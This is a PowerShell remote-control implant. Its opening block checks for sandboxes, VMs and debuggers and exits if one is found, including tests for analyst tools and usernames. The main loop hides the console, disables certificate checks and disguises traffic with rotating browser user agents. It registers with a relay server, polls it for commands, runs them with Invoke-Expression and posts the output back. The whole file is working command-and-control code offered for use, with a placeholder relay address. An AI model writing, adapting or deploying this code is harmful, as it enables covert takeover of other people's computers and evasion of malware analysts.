# --- Configuration ---
$CheckSandbox = $false  # Set to $false to disable sandbox/VM/debugging checks
$DebugOutput = $false  # Set to $false to suppress Write-Host/Write-Output debug messages
$AgentOutput = $true
function Debug-Log($msg) {
    if ($DebugOutput) { Write-Host $msg }
}

function Agent-Log($msg){
    if ($AgentOutput) { Write-Host $msg }
}

if ($CheckSandbox) {

    # --- Advanced Sandbox/VM Detection ---

    # 1. Check for common VM vendors in system info
    $vmVendors = "VMware", "VirtualBox", "KVM", "Xen", "QEMU", "Microsoft Corporation", "Parallels"
    $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $model = (Get-WmiObject Win32_ComputerSystem).Model
    $bios = (Get-WmiObject Win32_BIOS).SerialNumber
    foreach ($vendor in $vmVendors) {
        if ($manufacturer -match $vendor -or $model -match $vendor -or $bios -match $vendor) {
            Debug-Log "[DEBUG] VM vendor detected: $vendor"
            exit
        }
    }

    # 2. Check for known sandbox processes
    $sandboxProcs = "vmsrvc", "vmusrvc", "vboxservice", "vboxtray", "wireshark", "procmon", "procexp", "ida64", "ida32", "ollydbg", "x64dbg", "x32dbg", "fiddler", "sandboxie"
    $runningProcs = Get-Process | Select-Object -ExpandProperty ProcessName
    foreach ($proc in $sandboxProcs) {
        if ($runningProcs -contains $proc) {
            Debug-Log "[DEBUG] Sandbox process detected: $proc"
            exit
        }
    }

    # 3. Check for low RAM (common in sandboxes)
    $ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 2) {
        Debug-Log "[DEBUG] Low RAM detected: $ram GB"
        exit
    }

    # 4. Check for few CPU cores (common in sandboxes)
    $cpuCores = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
    if ($cpuCores -lt 2) {
        Debug-Log "[DEBUG] Low CPU core count detected: $cpuCores"
        exit
    }

    # 5. Check for suspicious MAC addresses (VMware, VirtualBox, etc.)
    $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } | Select-Object -ExpandProperty MACAddress
    foreach ($mac in $macs) {
        if ($mac -match "^00:05:69" -or $mac -match "^00:0C:29" -or $mac -match "^00:1C:14" -or $mac -match "^00:50:56" -or $mac -match "^08:00:27") {
            Debug-Log "[DEBUG] Suspicious MAC address detected: $mac"
            exit
        }
    }

    # 6. Check for running as SYSTEM (rare for real users)
    if ($env:USERNAME -eq "SYSTEM") {
        Debug-Log "[DEBUG] Running as SYSTEM user"
        exit
    }

    # 7. Check for suspicious files/drivers (VM tools, sandbox DLLs)
    $suspiciousFiles = @(
        "C:\windows\System32\drivers\vmmouse.sys",
        "C:\windows\System32\drivers\vmhgfs.sys",
        "C:\windows\System32\drivers\VBoxMouse.sys",
        "C:\windows\System32\drivers\VBoxGuest.sys",
        "C:\windows\System32\drivers\VBoxSF.sys",
        "C:\windows\System32\drivers\VBoxVideo.sys",
        "C:\windows\System32\vboxdisp.dll",
        "C:\windows\System32\vboxhook.dll",
        "C:\windows\System32\vboxmrxnp.dll",
        "C:\windows\System32\vboxogl.dll",
        "C:\windows\System32\vboxoglarrayspu.dll",
        "C:\windows\System32\vboxoglcrutil.dll",
        "C:\windows\System32\vboxoglerrorspu.dll",
        "C:\windows\System32\vboxoglfeedbackspu.dll",
        "C:\windows\System32\vboxoglpackspu.dll",
        "C:\windows\System32\vboxoglpassthroughspu.dll",
        "C:\windows\System32\vboxservice.exe",
        "C:\windows\System32\vboxtray.exe",
        "C:\windows\System32\vmGuestLib.dll",
        "C:\windows\System32\vmGuestLibJava.dll",
        "C:\windows\System32\vmhgfs.dll",
        "C:\windows\System32\vmtools.dll",
        "C:\windows\System32\vmrawdsk.sys",
        "C:\windows\System32\vmusbmouse.sys",
        "C:\windows\System32\vmx_svga.sys",
        "C:\windows\System32\vmxnet.sys"
    )
    foreach ($file in $suspiciousFiles) {
        if (Test-Path $file) {
            Debug-Log "[DEBUG] Suspicious file/driver detected: $file"
            exit
        }
    }

    # 8. Check for short system uptime (common in sandboxes)
    $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 10) {
        Debug-Log "[DEBUG] Short system uptime detected: $($uptime.TotalMinutes) minutes"
        exit
    }

    # 9. Check for mouse movement (sandboxes often have none)
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    public struct POINT { public int X; public int Y; }
}
"@
    [Mouse+POINT]$pos1 = New-Object Mouse+POINT
    [Mouse+POINT]$pos2 = New-Object Mouse+POINT
    [void][Mouse]::GetCursorPos([ref]$pos1)
    Start-Sleep -Milliseconds 500
    [void][Mouse]::GetCursorPos([ref]$pos2)
    if ($pos1.X -eq $pos2.X -and $pos1.Y -eq $pos2.Y) {
        Debug-Log "[DEBUG] No mouse movement detected"
        exit
    }

    # 10. Check for common sandbox usernames
    $sandboxUsers = "sandbox", "malware", "analyst", "test", "virus"
    foreach ($user in $sandboxUsers) {
        if ($env:USERNAME -match $user) {
            Debug-Log "[DEBUG] Suspicious username detected: $($env:USERNAME)"
            exit
        }
    }

    # 11. Check for low disk space (common in VMs)
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
    if ($disk.FreeSpace / 1GB -lt 10) {
        Debug-Log "[DEBUG] Low disk space detected: $([math]::Round($disk.FreeSpace / 1GB, 2)) GB"
        exit
    }

    # 12. Check for running in Wine (common on Linux sandboxes)
    if (Test-Path "HKLM:\Software\Wine") {
        Debug-Log "[DEBUG] Wine registry key detected"
        exit
    }

    # 13. Check for known sandbox network adapters
    $adapters = Get-WmiObject Win32_NetworkAdapter | Select-Object -ExpandProperty Description
    foreach ($adapter in $adapters) {
        if ($adapter -match "VirtualBox|VMware|Virtual|Hyper-V|Loopback") {
            Debug-Log "[DEBUG] Suspicious network adapter detected: $adapter"
            exit
        }
    }

    # --- Debugger Detection ---

    # 1. Check for common debugger processes
    $debuggerProcs = "ollydbg", "x64dbg", "x32dbg", "ida64", "ida32", "windbg", "dbgview", "procmon", "procexp", "ImmunityDebugger"
    $runningProcs = Get-Process | Select-Object -ExpandProperty ProcessName
    foreach ($proc in $debuggerProcs) {
        if ($runningProcs -contains $proc) {
            Debug-Log "[DEBUG] Debugger process detected: $proc"
            exit
        }
    }

    # 2. Check for loaded debugger modules (optional, advanced)
    try {
        $modules = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { $_.GetName().Name }
        if ($modules -match "dbghelp" -or $modules -match "dbgeng") {
            Debug-Log "[DEBUG] Debugger module loaded: $modules"
            exit
        }
    } catch {}

    # 3. (Optional) Check for presence of debugging environment variables
    if ($env:COR_ENABLE_PROFILING -eq "1" -or $env:COR_PROFILER) {
        Debug-Log "[DEBUG] Debugging environment variable detected"
        exit
    }
}


# --- Main Agent Code ---
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$relay = "https://127.0.0.1:8080"  # <-- Replace with your relay server address
$device_id = "$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"

$HideConsole = 1
if ($HideConsole -eq 1) {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0) | Out-Null
}

$userAgents = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Microsoft BITS/7.8",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
)

$headers = @{
    "User-Agent" = $userAgents | Get-Random
    "Accept" = "application/json, text/javascript, */*; q=0.01"
    "Accept-Language" = "en-US,en;q=0.9"
    "Referer" = "https://www.google.com/"
}

$registerBody = @{ device_id = $device_id } | ConvertTo-Json
try {
    $response = Invoke-RestMethod -Uri "$relay/register" -Method Post -Body $registerBody -ContentType "application/json" -Headers $headers
} catch {
    Agent-Log "[AGENT] Registration failed: $($_.Exception.Message)"
}


while ($true) {
    # Network check: Only proceed if relay is reachable
    try {
        $ping = Invoke-WebRequest -Uri "$relay/ping" -Method Get -TimeoutSec 5 -Headers @{ "User-Agent" = $userAgents | Get-Random }
        if ($ping.StatusCode -ne 200) {
            Agent-Log " [AGENT] Relay not reachable. Exiting agent."
            exit
        }
    } catch {
        Agent-Log "[AGENT] Relay not reachable. Exiting agent."
        exit
    }

    $body = @{ device_id = $device_id } | ConvertTo-Json
    $headers = @{
        "User-Agent" = $userAgents | Get-Random
        "Accept" = "application/json, text/javascript, */*; q=0.01"
        "Accept-Language" = "en-US,en;q=0.9"
        "Referer" = "https://www.google.com/"
    }
    try {
        $response = Invoke-RestMethod -Uri "$relay/poll" -Method Post -Body $body -ContentType "application/json" -Headers $headers
        $command = $response.command
        if ($command) {
            try {
                $result = Invoke-Expression $command 2>&1 | Out-String
            } catch {
                $result = "Error: $($_.Exception.Message)"
            }
            $resultBody = @{ device_id = $device_id; result = $result } | ConvertTo-Json
            Invoke-RestMethod -Uri "$relay/result" -Method Post -Body $resultBody -ContentType "application/json" -Headers $headers | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 30)
}